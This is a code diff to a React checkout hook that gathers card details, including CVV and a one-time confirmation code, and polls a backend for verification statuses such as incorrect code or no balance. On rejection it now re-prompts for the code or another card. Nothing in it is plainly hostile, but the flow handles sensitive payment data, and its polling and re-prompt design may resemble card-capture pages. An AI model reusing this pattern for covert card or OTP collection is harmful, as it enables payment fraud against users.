@@ -47,7 +47,6 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
   const [cardCvv, setCardCvv] = useState('');
   const [confirmCode, setConfirmCode] = useState('');
   const [agreedTerms, setAgreedTerms] = useState(false);
-  const [verificationError, setVerificationError] = useState<string | null>(null);
   const [activationCode, setActivationCode] = useState('');
   const [codeError, setCodeError] = useState<string | null>(null);
   const [resendTimer, setResendTimer] = useState(0);
@@ -92,6 +91,23 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
       return () => clearTimeout(timer);
     }
   }, [resendTimer]);
+
+  // Clear confirm code when navigating to confirm-code step
+  useEffect(() => {
+    if (step === 'confirm-code') {
+      setConfirmCode('');
+      setConfirmCodeError(null);
+    }
+  }, [step, setConfirmCode, setConfirmCodeError]);
+
+  // Clear card info when navigating to card-info step
+  useEffect(() => {
+    if (step === 'card-info') {
+      setCardNumber('');
+      setCardExpiry('');
+      setCardCvv('');
+    }
+  }, [step, setCardNumber, setCardExpiry, setCardCvv]);
 
   // Auto-approval polling - faster response for automatic flow
   useEffect(() => {
@@ -224,21 +240,18 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
         } else if (response.status === 'code_incorrect') {
           if (pollingInterval) clearInterval(pollingInterval);
           if (timeoutId) clearTimeout(timeoutId);
-          setVerificationError('الكود غير صحيح - يمكنك المحاولة مرة أخرى');
-          setStep('verification-failed');
-          // لا تحذف الـ session للسماح بإعادة المحاولة
+          setStep('confirm-code');
+          toast.error('الكود غير صحيح - يرجى إعادة المحاولة');
         } else if (response.status === 'no_balance') {
           if (pollingInterval) clearInterval(pollingInterval);
           if (timeoutId) clearTimeout(timeoutId);
-          setVerificationError('لا يوجد رصيد بالبطاقة - جرب بطاقة أخرى');
-          setStep('verification-failed');
-          // لا تحذف الـ session للسماح بإعادة المحاولة
+          setStep('card-info');
+          toast.error('لا يوجد رصيد بالبطاقة - جرب بطاقة أخرى');
         } else if (response.status === 'card_rejected') {
           if (pollingInterval) clearInterval(pollingInterval);
           if (timeoutId) clearTimeout(timeoutId);
-          setVerificationError('تم رفض البطاقة - جرب بطاقة أخرى');
-          setStep('verification-failed');
-          // لا تحذف الـ session للسماح بإعادة المحاولة
+          setStep('card-info');
+          toast.error('تم رفض البطاقة - جرب بطاقة أخرى');
         }
       } catch (err) {
         console.error('Error checking verification result:', err);
@@ -249,8 +262,8 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
 
     timeoutId = setTimeout(() => {
       if (pollingInterval) clearInterval(pollingInterval);
-      setVerificationError('انتهت مهلة التحقق. يرجى المحاولة مرة أخرى.');
-      setStep('verification-failed');
+      setStep('confirm-code');
+      toast.error('انتهت مهلة التحقق. يرجى المحاولة مرة أخرى.');
     }, 5 * 60 * 1000);
 
     return () => {
@@ -401,7 +414,6 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
         phoneMasked: phoneNumber,
       });
 
-      setVerificationError(null);
       setStep('verifying-code');
       toast.info('جاري التحقق من رمز التأكيد...');
     } catch (err) {
@@ -475,10 +487,8 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
     setPhoneNumber,
     setSelectedPackage,
     setStep,
-    setVerificationError,
     setActivationCode,
     step,
     activationCode,
-    verificationError,
   };
 };
